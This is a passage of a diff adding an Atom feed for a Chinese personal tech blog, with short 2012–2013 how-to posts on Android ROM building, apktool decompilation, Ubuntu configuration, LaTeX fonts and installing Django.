+      &lt;p&gt;本文主要记录了如何在Ubuntu 12.04 LTS 64bit下使用AOSP源码编译用于Nexus 4的Android 4.3 ROM。&lt;/p&gt;
+&lt;p&gt;一、编译需求&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Linux/Mac OS&lt;/li&gt;
+&lt;li&gt;Froyo(2.2.x)以前可以使用32bit的操作系统，Gingerbread(2.3.x)之后的版本需要64bit操作系统&lt;/li&gt;
+&lt;li&gt;30GB以上的硬盘空间&lt;/li&gt;
+&lt;li&gt;Python 2.6-2.7&lt;/li&gt;
+&lt;li&gt;GNU Make 3.81-3.82&lt;/li&gt;
+&lt;li&gt;如果编译Gingerbread(2.3.x)之后的版本需要JDK 6，如果编译的是Froyo(2.2.x)或更老的版本则使用JDK 5&lt;/li&gt;
+&lt;li&gt;Git 1.7或更新版本&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+      <category term="移动计算" scheme="http://blog.clarkhuang.com/categories/%E7%A7%BB%E5%8A%A8%E8%AE%A1%E7%AE%97/"/>
+    
+    
+      <category term="Android" scheme="http://blog.clarkhuang.com/tags/Android/"/>
+    
+      <category term="Ubuntu" scheme="http://blog.clarkhuang.com/tags/Ubuntu/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Android反编译APK</title>
+    <link href="http://blog.clarkhuang.com/2013/08/17/android-decompile-apk/"/>
+    <id>http://blog.clarkhuang.com/2013/08/17/android-decompile-apk/</id>
+    <published>2013-08-17T12:00:31.000Z</published>
+    <updated>2016-05-22T05:09:56.000Z</updated>
+    
+    <content type="html">&lt;p&gt;APK文件可以使用apktool工具进行反编译。&lt;/p&gt;
+&lt;p&gt;apktool需要以下几样东西&lt;/p&gt;
+&lt;p&gt;1、JRE 1.6 (Java Runtime Environment)，1.7也行&lt;/p&gt;
+&lt;p&gt;2、确保aapt命令在你的PATH中&lt;/p&gt;
+&lt;p&gt;首先需要再apktool的网站下载apktool.jar。其官网地址如下：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://code.google.com/p/android-apktool&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://code.google.com/p/android-apktool/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;如果没有aapt的也可以顺便从官网下载对应系统的aapt及相关脚本。&lt;/p&gt;
+&lt;p&gt;这样在Windows下可以得到aapt.exe, apktool.bat和apktool.jar三个文件。&lt;/p&gt;
+&lt;p&gt;命令行转至apktool.jar所在文件夹，输入apktool，如果有相关提示则说明apktool是可以使用了。&lt;/p&gt;
+&lt;p&gt;apktool的相关命令：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;apktool d ABC.apk ABC&lt;/code&gt;将ABC.apk反编译并输出到ABC文件夹下&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;apktool b ABC&lt;/code&gt;将ABC重新构建为APK文件，并输出到&lt;code&gt;./ABC/dist/out.apk&lt;/code&gt;中&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;APK文件可以使用apktool工具进行反编译。&lt;/p&gt;
+&lt;p&gt;apktool需要以下几样东西&lt;/p&gt;
+&lt;p&gt;1、JRE 1.6 (Java Runtime Environment)，1.7也行&lt;/p&gt;
+&lt;p&gt;2、确保aapt命令在你的PATH中&lt;/p&gt;
+&lt;p&gt;首先需要再a
+    
+    </summary>
+    
+      <category term="移动计算" scheme="http://blog.clarkhuang.com/categories/%E7%A7%BB%E5%8A%A8%E8%AE%A1%E7%AE%97/"/>
+    
+    
+      <category term="Android" scheme="http://blog.clarkhuang.com/tags/Android/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ubuntu12.04LTS开机自动启用小键盘</title>
+    <link href="http://blog.clarkhuang.com/2013/07/09/enable-number-lock-when-boot-in-ubuntu/"/>
+    <id>http://blog.clarkhuang.com/2013/07/09/enable-number-lock-when-boot-in-ubuntu/</id>
+    <published>2013-07-09T12:00:22.000Z</published>
+    <updated>2016-05-22T05:13:51.000Z</updated>
+    
+    <content type="html">&lt;p&gt;Ubuntu 12.04开机时默认是关闭小键盘的，我找遍设置也没发现哪里可以开机自启动小键盘，这样每次开机都要按下&lt;code&gt;NUM_LOCK&lt;/code&gt;键，很不方便。通过以下办法就可以达到开机启动时就打开小键盘。&lt;/p&gt;
+&lt;p&gt;首先需要下载一个叫做numlockx的小软件&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install numlockx&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;然后编辑&lt;code&gt;/etc/gdm/Init/Default&lt;/code&gt;文件，在最后一行&lt;code&gt;exit 0&lt;/code&gt;的前面添加如下内容&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;if [ -x /usr/bin/numlockx ]; then&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;numlockx on&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fi&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;下次启动时就能看到效果了。&lt;/p&gt;
+&lt;p&gt;PS：该方法只对Gnome有效。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Ubuntu 12.04开机时默认是关闭小键盘的，我找遍设置也没发现哪里可以开机自启动小键盘，这样每次开机都要按下&lt;code&gt;NUM_LOCK&lt;/code&gt;键，很不方便。通过以下办法就可以达到开机启动时就打开小键盘。&lt;/p&gt;
+&lt;p&gt;首先需要下载一个叫做numlockx的小软
+    
+    </summary>
+    
+      <category term="操作系统" scheme="http://blog.clarkhuang.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
+    
+    
+      <category term="Linux" scheme="http://blog.clarkhuang.com/tags/Linux/"/>
+    
+      <category term="Ubuntu" scheme="http://blog.clarkhuang.com/tags/Ubuntu/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Python采用UTF-8编码</title>
+    <link href="http://blog.clarkhuang.com/2013/03/10/utf-8-code-in-python/"/>
+    <id>http://blog.clarkhuang.com/2013/03/10/utf-8-code-in-python/</id>
+    <published>2013-03-10T14:55:14.000Z</published>
+    <updated>2016-05-22T06:18:02.000Z</updated>
+    
+    <content type="html">&lt;p&gt;Python在Windows下默认采用ANSI编码，有时中文就会有些问题。&lt;/p&gt;
+&lt;p&gt;我们只需要将以下代码添加在Python文件的开始即可将Python文件的编码改为UTF-8格式。&lt;/p&gt;
+&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Python在Windows下默认采用ANSI编码，有时中文就会有些问题。&lt;/p&gt;
+&lt;p&gt;我们只需要将以下代码添加在Python文件的开始即可将Python文件的编码改为UTF-8格式。&lt;/p&gt;
+&lt;figure class=&quot;highlight python&quot;&gt;&lt;table
+    
+    </summary>
+    
+      <category term="编程语言" scheme="http://blog.clarkhuang.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
+    
+    
+      <category term="Python" scheme="http://blog.clarkhuang.com/tags/Python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>EPS图片简单转换方法</title>
+    <link href="http://blog.clarkhuang.com/2013/01/07/easy-method-to-convert-eps-figure/"/>
+    <id>http://blog.clarkhuang.com/2013/01/07/easy-method-to-convert-eps-figure/</id>
+    <published>2013-01-06T16:00:52.000Z</published>
+    <updated>2016-05-22T05:12:19.000Z</updated>
+    
+    <content type="html">&lt;p&gt;在LaTeX中一般使用的是EPS格式的图片，但是我们平时获取的却大都是PNG或JPEG格式的图片，虽然在LaTeX中也能使用，但总不如EPS格式来的好，于是就需要将PNG、JPEG格式的图片转换为EPS格式。这里我们可以使用bmeps这个免费的小工具。&lt;/p&gt;
+&lt;p&gt;1、将PNG、JPEG图片转换成EPS图片&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bmeps image.png image.eps&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;2、转换彩色图片&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bmeps -c image.png image.eps&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在LaTeX中一般使用的是EPS格式的图片，但是我们平时获取的却大都是PNG或JPEG格式的图片，虽然在LaTeX中也能使用，但总不如EPS格式来的好，于是就需要将PNG、JPEG格式的图片转换为EPS格式。这里我们可以使用bmeps这个免费的小工具。&lt;/p&gt;
+&lt;p&gt;1、将
+    
+    </summary>
+    
+      <category term="编程语言" scheme="http://blog.clarkhuang.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
+    
+    
+      <category term="LaTeX" scheme="http://blog.clarkhuang.com/tags/LaTeX/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ubuntu命令行中Tab自动补全</title>
+    <link href="http://blog.clarkhuang.com/2012/12/21/teminal-auto-complete-in-ubuntu/"/>
+    <id>http://blog.clarkhuang.com/2012/12/21/teminal-auto-complete-in-ubuntu/</id>
+    <published>2012-12-21T02:00:05.000Z</published>
+    <updated>2016-05-22T06:11:08.000Z</updated>
+    
+    <content type="html">&lt;p&gt;Ubuntu 12.04.1 LTS刚装好命令行中输入命令是没有自动补全的，可以做如下修改增加命令行的命令自动补全功能。&lt;/p&gt;
+&lt;p&gt;修改/etc/bash.bashrc文件&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# enable bash completion in interactive shells&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; /etc/bash_completion ] &amp;amp;&amp;amp; ! &lt;span class=&quot;built_in&quot;&gt;shopt&lt;/span&gt; -oq posix; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    . /etc/bash_completion&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;取消上面3行代码的注释，保存即可，当再次打开命令行时就能使用自动补全的功能了。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Ubuntu 12.04.1 LTS刚装好命令行中输入命令是没有自动补全的，可以做如下修改增加命令行的命令自动补全功能。&lt;/p&gt;
+&lt;p&gt;修改/etc/bash.bashrc文件&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
+    
+    </summary>
+    
+      <category term="操作系统" scheme="http://blog.clarkhuang.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
+    
+    
+      <category term="Linux" scheme="http://blog.clarkhuang.com/tags/Linux/"/>
+    
+      <category term="Ubuntu" scheme="http://blog.clarkhuang.com/tags/Ubuntu/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>在Ubuntu Server中安装VirtualBox增强包</title>
+    <link href="http://blog.clarkhuang.com/2012/11/25/how-to-install-virtualbox-guest-additions-in-ubuntu-server/"/>
+    <id>http://blog.clarkhuang.com/2012/11/25/how-to-install-virtualbox-guest-additions-in-ubuntu-server/</id>
+    <published>2012-11-25T12:19:37.000Z</published>
+    <updated>2016-05-22T06:01:46.000Z</updated>
+    
+    <content type="html">&lt;p&gt;Server中装增强包主要是用来和主机共享文件夹，在Desktop版中增强包还能够自动调整分辨率，与主机共享粘贴板(不包括文件)等。&lt;/p&gt;
+&lt;p&gt;在Ubuntu 12.04.1 LTS Server版中安装VirtualBox增强包主要有一下几个步骤：&lt;/p&gt;
+&lt;p&gt;1、选择设备-&amp;gt;安装增强功能 &lt;/p&gt;
+&lt;p&gt;2、安装以下的包&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo aptitude install build-essential linux-headers-$(uname -r) -y&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;3、挂载CD-ROM&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo mount /dev/cdrom /mnt/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;4、安装增强包&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo /mnt/VBoxLinuxAdditions.run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;5、卸载CD-ROM&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo umount /mnt/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;PS: 最后一项会安装失败，但是不影响使用。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Server中装增强包主要是用来和主机共享文件夹，在Desktop版中增强包还能够自动调整分辨率，与主机共享粘贴板(不包括文件)等。&lt;/p&gt;
+&lt;p&gt;在Ubuntu 12.04.1 LTS Server版中安装VirtualBox增强包主要有一下几个步骤：&lt;/p&gt;
+&lt;p&gt;1、
+    
+    </summary>
+    
+      <category term="操作系统" scheme="http://blog.clarkhuang.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
+    
+    
+      <category term="Linux" scheme="http://blog.clarkhuang.com/tags/Linux/"/>
+    
+      <category term="Ubuntu" scheme="http://blog.clarkhuang.com/tags/Ubuntu/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ubuntu配置、更新、修改IP地址</title>
+    <link href="http://blog.clarkhuang.com/2012/11/21/configure-ip-address-in-ubuntu/"/>
+    <id>http://blog.clarkhuang.com/2012/11/21/configure-ip-address-in-ubuntu/</id>
+    <published>2012-11-21T14:00:23.000Z</published>
+    <updated>2016-05-22T05:11:50.000Z</updated>
+    
+    <content type="html">&lt;p&gt;1、Ubuntu系统修改IP地址&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo emacs /etc/network/interfaces&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;auto eth0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;iface eth0 inet static&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;address 219.218.122.168&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;netmask  255.255.255.0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;gateway  219.218.122.254&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;2、Ubuntu系统修改DNS&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo emacs /etc/resolv.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;nameserver 202.194.15.12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;3、使网络生效&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo /etc/init.d/networking restart&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;1、Ubuntu系统修改IP地址&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;
+    
+    </summary>
+    
+      <category term="操作系统" scheme="http://blog.clarkhuang.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
+    
+    
+      <category term="Linux" scheme="http://blog.clarkhuang.com/tags/Linux/"/>
+    
+      <category term="Ubuntu" scheme="http://blog.clarkhuang.com/tags/Ubuntu/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>XeLaTeX中文字体设置</title>
+    <link href="http://blog.clarkhuang.com/2012/11/02/configure-chinese-font-in-xelatex/"/>
+    <id>http://blog.clarkhuang.com/2012/11/02/configure-chinese-font-in-xelatex/</id>
+    <published>2012-11-02T12:00:58.000Z</published>
+    <updated>2016-05-22T05:11:16.000Z</updated>
+    
+    <content type="html">&lt;p&gt;在XeLaTeX中显示中文字符与在LaTeX的CJK环境中不同，但是也很简单。而且在XeLaTeX中可以使用操作系统自带的字体。&lt;/p&gt;
+&lt;p&gt;在设置字体前需在导言区加上相应的包&lt;/p&gt;
+&lt;figure class=&quot;highlight tex&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;\&lt;span class=&quot;name&quot;&gt;usepackage&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;#123;fontspec,xunicode,xltxtra&amp;#125;&lt;/span&gt;&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;% XeLaTeX相关字体字库&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;然后在设置相应的字体&lt;/p&gt;
+&lt;figure class=&quot;highlight tex&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;%以宋体为例&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;\&lt;span class=&quot;name&quot;&gt;setCJKfamilyfont&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;#123;song&amp;#125;&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;#123;SimSun&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;\&lt;span class=&quot;name&quot;&gt;newcommand&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;#123;\song&amp;#125;&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;#123;\CJKfamily&amp;#123;song&amp;#125;&lt;/span&gt;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;使用时在文字前加上\song，之后的文字就会变成宋体了。&lt;/p&gt;
+&lt;p&gt;PS:SimSun对应的是操作系统中宋体的名字。如果想查看系统中的所有字体，之需在命令行中输入&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;fc&lt;/span&gt;-list &amp;gt; font.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;所有的字体就会保存到font.txt文件中，以UTF-8格式查看即可。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在XeLaTeX中显示中文字符与在LaTeX的CJK环境中不同，但是也很简单。而且在XeLaTeX中可以使用操作系统自带的字体。&lt;/p&gt;
+&lt;p&gt;在设置字体前需在导言区加上相应的包&lt;/p&gt;
+&lt;figure class=&quot;highlight tex&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
+    
+    </summary>
+    
+      <category term="编程语言" scheme="http://blog.clarkhuang.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
+    
+    
+      <category term="LaTeX" scheme="http://blog.clarkhuang.com/tags/LaTeX/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>如何安装Django</title>
+    <link href="http://blog.clarkhuang.com/2012/07/16/how-to-install-django/"/>
+    <id>http://blog.clarkhuang.com/2012/07/16/how-to-install-django/</id>
+    <published>2012-07-15T16:00:40.000Z</published>
+    <updated>2016-05-22T06:01:24.000Z</updated>
+    
+    <content type="html">&lt;p&gt;实习的第一个任务就是要用Django框架重写实验室网站。Django是用python语言写的开源web开发框架(open source web framework)，它鼓励快速开发,并遵循MTV设计。它的安装相当简单。&lt;/p&gt;
+&lt;p&gt;1、从官网上下载Django源代码&lt;/p&gt;
+&lt;p&gt;Django 1.4的下载地址是&lt;a href=&quot;https://www.djangoproject.com/download/1.4/tarball/&quot; title=&quot;https://www.djangoproject.com/download/1.4/tarball/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.djangoproject.com/download/1.4/tarball/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;2、解压&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;tar xzvf Django-1.4.tar.gz&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;3、安装&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo python setup.py install&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;安装完毕后创建个项目测试下&lt;/p&gt;
+&lt;p&gt;创建Django项目&lt;/p&gt;
